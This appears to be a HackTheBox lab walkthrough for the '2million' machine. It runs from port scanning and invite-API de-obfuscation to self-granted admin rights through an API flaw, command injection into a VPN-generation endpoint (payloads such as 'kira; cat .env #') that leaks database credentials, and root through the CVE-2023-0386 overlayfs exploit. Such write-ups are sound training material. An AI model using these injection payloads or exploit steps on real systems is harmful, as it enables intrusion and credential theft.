@@ -1,0 +1,360 @@
+
+#  nmap 
+
+				┌──(kali㉿kali)-[~/HackTheBox/vpn]
+				└─$ nmap -p- 10.10.11.221 --min-rate=1000
+				Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-03 07:16 EDT
+				Nmap scan report for 10.10.11.221
+				Host is up (0.28s latency).
+				Not shown: 65533 closed tcp ports (reset)
+				PORT   STATE SERVICE
+				22/tcp open  ssh
+				80/tcp open  http
+				Nmap done: 1 IP address (1 host up) scanned in 80.79 seconds
+				____________________________________________________________________________________________
+# network enumeration
+
+				┌──(kali㉿kali)-[~/HackTheBox/vpn]
+				└─$ nmap -p22,80 -sC -A 10.10.11.221 --min-rate=1000
+				Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-03 07:18 EDT
+				Nmap scan report for 10.10.11.221
+				Host is up (0.28s latency).
+
+				PORT   STATE SERVICE VERSION
+				22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+				| ssh-hostkey:
+				|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
+				|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
+				80/tcp open  http    nginx
+				|_http-title: Did not follow redirect to http://2million.htb/
+				Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+				Device type: general purpose|router
+				Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
+				OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
+				OS details: Linux 4.15 - 5.19, Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
+				Network Distance: 2 hops
+				Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+				TRACEROUTE (using port 80/tcp)
+				HOP RTT       ADDRESS
+				1   281.33 ms 10.10.14.1
+				2   281.31 ms 10.10.11.221
+				OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+				Nmap done: 1 IP address (1 host up) scanned in 21.42 seconds
+______________________________________________________________________________________________________________________
+
+## targeted endpoint
+
+- /invite
+
+`source code`
+   <script src="/js/htb-frontend.min.js"></script>
+    <script defer src="/js/inviteapi.min.js"></script>
+    <script defer>
+       $(document).ready(function() {
+            $('#verifyForm').submit(function(e) {
+                e.preventDefault();
+
+                var code = $('#code').val();
+                var formData = { "code": code };
+
+                $.ajax({
+                    type: "POST",
+                    dataType: "json",
+                    data: formData,
+                    url: '/api/v1/invite/verify',
+                    success: function(response) {
+                        if (response[0] === 200 && response.success === 1 && response.data.message === "Invite code is valid!") {
+                            // Store the invite code in localStorage
+                            localStorage.setItem('inviteCode', code);
+
+                            window.location.href = '/register';
+                        } else {
+                            alert("Invalid invite code. Please try again.");
+                        }
+                    },
+                    error: function(response) {
+                        alert("An error occurred. Please try again.");
+                    }
+
+____________________________________________________________________________________________
+
+# fishy / juicy
+src="/js/inviteapi.min.js
+/api/v1/invite/verify
+
+____________________________________________________________________________________________
+
+# inspecting the static endpoint...
+eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c>
+
+# de-obfuscating this code...
+
+```
+ function verifyInviteCode(code) {
+    var formData = { "code": code };
+    $.ajax({
+        type: "POST",
+        dataType: "json",
+        data: formData,
+        url: '/api/v1/invite/verify',
+        success: function(response) {
+            console.log(response);
+        },
+        error: function(response) {
+            console.log(response);
+        }
+    });
+}
+
+function makeInviteCode() {
+    $.ajax({
+        type: "POST",
+        dataType: "json",
+        url: '/api/v1/invite/how/to/generate',
+        success: function(response) {
+            console.log(response);
+        },
+        error: function(response) {
+            console.log(response);
+        }
+    });
+}
+```
+____________________________________________________________________________________________
+
+ ### From this point onward if you stop the machine you need to redo the procedure ###
+ 
+[ "I was having problems because my valid and new credentials were also no working well guess what i didn't fire up the machine lol!" ]
+
+# juicy
+- /api/v1/invite/how/to/generate
+
+[ This endpoint seems very interesting, so in order to access it we  use cURL. ]
+
+┌──(kali㉿kali)-[~/HackTheBox/2mil]
+└─$ curl -X POST http://2million.htb/api/v1/invite/how/to/generate | jq #beautify the outputted JSON
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100   249    0   249    0     0    320      0 --:--:-- --:--:-- --:--:--   321
+{
+  "0": 200,
+  "success": 1,
+  "data": {
+    "data": "Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb /ncv/i1/vaivgr/trarengr",
+    "enctype": "ROT13"
+  },
+  "hint": "Data is encrypted ... We should probbably check the encryption type in order to decrypt it..."
+}
+____________________________________________________________________________________________
+
+# decoding
+Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb /ncv/i1/vaivgr/trarengr
+
+# decoded
+In order to generate the invite code, make a POST request to /api/v1/invite/generate
+____________________________________________________________________________________________
+
+# Following instructions from decoded data
+
+┌──(kali㉿kali)-[~/HackTheBox/2mil]
+└─$ curl -X POST http://2million.htb/api/v1/invite/generate | jq
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100    91    0    91    0     0    116      0 --:--:-- --:--:-- --:--:--   116
+{
+  "0": 200,
+  "success": 1,
+  "data": {
+    "code": "VVAwMzMtRVNHUzQtRjQwSzYtV1FNMTI=",
+    "format": "encoded"
+  }
+}
+____________________________________________________________________________________________
+
+# decoding the code
+┌──(kali㉿kali)-[~/HackTheBox/2mil]
+└─$ echo VVAwMzMtRVNHUzQtRjQwSzYtV1FNMTI= | base64 -d
+UP033-ESGS4-F40K6-WQM12
+____________________________________________________________________________________________
+
+## attack vector ##
+#not from sitemap where your proxy is crawling but after your authentacation
+- REquest
+	GET /api/v1 HTTP/1.1
+____________________________________________________________________________________________
+- Response
+
+("jeez obsucate it uyoursself.")
+{"v1":{"user":{"GET":{"\/api\/v1":"Route List","\/api\/v1\/invite\/how\/to\/generate":"Instructions on invite code generation","\/api\/v1\/invite\/generate":"Generate invite code","\/api\/v1\/invite\/verify":>
+____________________________________________________________________________________________
+
+# got this
+
+{"loggedin":true,"username":"kira","is_admin":0}
+
+# from 
+GET /api/v1/user/auth HTTP/1.1
+
+____________________________________________________________________________________________
+# got this
+
+{"message":false}
+
+# from
+GET /api/v1/admin/auth HTTP/1.1
+
+____________________________________________________________________________________________
+
+# breakthrough
+"Got this"
+{"id":20,"username":"kira","is_admin":1}
+
+"from this"
+PUT /api/v1/admin/settings/update HTTP/1.1
+
+{
+"email":"kira@mail.com",
+"is_admin":1
+}
+____________________________________________________________________________________________
+now now we are said to abuse
+/api/v1/admin/generate/vpn but...
+most walkthroughs just say “do OS command injection here” without explaining why that endpoint screams injection. Let’s break it down;
+
+- The endpoint’s name implies it’s generating VPN configs.
+- That often involves calling system tools like openvpn, easy-rsa, or shell scripts.
+- If the backend is invoking shell commands with user-supplied input (e.g., username, config name), that’s a classic injection vector
+
+# further testing
+
+"Got this"
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+"From"
+/api/v1/admin/generate/vpn
+
+{
+"email":"kira@mail.com",
+"username": "kira;id;",
+"is_admin":1
+}
+____________________________________________________________________________________________
+# got credentials
+
+REQUEST
+{
+"email":"kira@mail.com",
+"username": "kira; cat .env #",
+"is_admin":1
+}
+
+RESPONSE
+
+DB_HOST=127.0.0.1
+DB_DATABASE=htb_prod
+DB_USERNAME=admin
+DB_PASSWORD=SuperDuperPass123
+____________________________________________________________________________________________
+
+# verifed creds
+┌──(kali㉿kali)-[~/HackTheBox/2mil]
+└─$ ssh admin@10.10.11.221
+____________________________________________________________________________________________
+
+# user flag (I'm playing in adventure mode btw...)
+admin@2million:~$ ls
+CVE-2023-0386-main  user.txt
+admin@2million:~$ cat user.txt
+____________________________________________________________________________________________
+
+# exploring the file system
+admin@2million:~$ cd ..
+admin@2million:/home$ ls
+admin
+admin@2million:/home$ ls -la
+total 12
+drwxr-xr-x  3 root  root  4096 Jun  6  2023 .
+drwxr-xr-x 19 root  root  4096 Jun  6  2023 ..
+drwxr-xr-x  4 admin admin 4096 Jun  6  2023 admin
+admin@2million:/home$ cd ..
+admin@2million:/$ ls
+bin  boot  dev  etc  home  lib  lib32  lib64  libx32  lost+found  media  mnt  opt  proc  root  run  sbin  snap  srv  sys  tmp  usr  var
+admin@2million:/$ cd var
+admin@2million:/var$ ls
+backups  cache  crash  lib  local  lock  log  mail  opt  run  snap  spool  tmp  www
+____________________________________________________________________________________________
+#reading the mail
+admin@2million:/var$ cd mail
+admin@2million:/var/mail$ ls
+admin
+admin@2million:/var/mail$ cat admin
+From: ch4p <ch4p@2million.htb>
+To: admin <admin@2million.htb>
+Cc: g0blin <g0blin@2million.htb>
+Subject: Urgent: Patch System OS
+Date: Tue, 1 June 2023 10:45:22 -0700
+Message-ID: <9876543210@2million.htb>
+X-Mailer: ThunderMail Pro 5.2
+____________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________
+Hey admin,
+
+I'm know you're working as fast as you can to do the DB migration. While we're partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. T>
+
+HTB Godfather
+____________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________
+# since we're already SSH'ed in the box we will skip the steps of documentation about installing other packages and softwares
+
+admin@2million:/$ cd tmp
+admin@2million:/tmp$ ls
+snap-private-tmp                                                              systemd-private-d8a91fad6b604801b336e99afa50f137-systemd-logind.service-ezGLYI     vmware-root_584-2688619665
+systemd-private-d8a91fad6b604801b336e99afa50f137-memcached.service-EgC5i5     systemd-private-d8a91fad6b604801b336e99afa50f137-systemd-resolved.service-qYCvIg
+systemd-private-d8a91fad6b604801b336e99afa50f137-ModemManager.service-gwuxqg  systemd-private-d8a91fad6b604801b336e99afa50f137-systemd-timesyncd.service-sVV74q
+____________________________________________________________________________________________
+
+# now we will write the program (CVE) in the system
+//which can be found here: https://github.com/DataDog/security-labs-pocs/blob/main/proof-of-concept-exploits/overlayfs-cve-2023-0386/poc.c
+____________________________________________________________________________________________
+
+# now following instructions
+admin@2million:/tmp$ gcc poc.c -o poc -D_FILE_OFFSET_BITS=64 -static -lfuse -ldl
+/usr/bin/ld: /usr/lib/gcc/x86_64-linux-gnu/11/../../../x86_64-linux-gnu/libfuse.a(fuse.o): in function `fuse_new_common':
+(.text+0xaf4e): warning: Using 'dlopen' in statically linked applications requires at runtime the shared libraries from the glibc version used for linking
+admin@2million:/tmp$ chmod +x poc && ./poc
+Waiting 1 sec...
+unshare -r -m sh -c 'mount -t overlay overlay -o lowerdir=/tmp/ovlcap/lower,upperdir=/tmp/ovlcap/upper,workdir=/tmp/ovlcap/work /tmp/ovlcap/merge && ls -la /tmp/ovlcap/merge && touch /tmp/ovlcap/merge/file'
+[+] readdir
+[+] getattr_callback
+/file
+total 8
+drwxrwxr-x 1 root   root     4096 Sep  9 03:06 .
+drwxrwxr-x 6 root   root     4096 Sep  9 03:06 ..
+-rwsrwxrwx 1 nobody nogroup 16096 Jan  1  1970 file
+[+] open_callback
+/file
+[+] read_callback
+    cnt  : 0
+    clen  : 0
+    path  : /file
+    size  : 0x4000
+    offset: 0x0
+[+] open_callback
+/file
+[+] open_callback
+/file
+[+] ioctl callback
+path /file
+cmd 0x80086601
+/tmp/ovlcap/upper/file
+To run a command as administrator (user "root"), use "sudo <command>".
+See "man sudo_root" for details.
+____________________________________________________________________________________________
+
+# and now we are root
+root@2million:/tmp# id
+uid=0(root) gid=0(root) groups=0(root),1000(admin)
+
+# the flag can be found in th /root directory
+root@2million:/tmp# cd /root
+root@2million:/root# ls
+root.txt  snap  thank_you.json
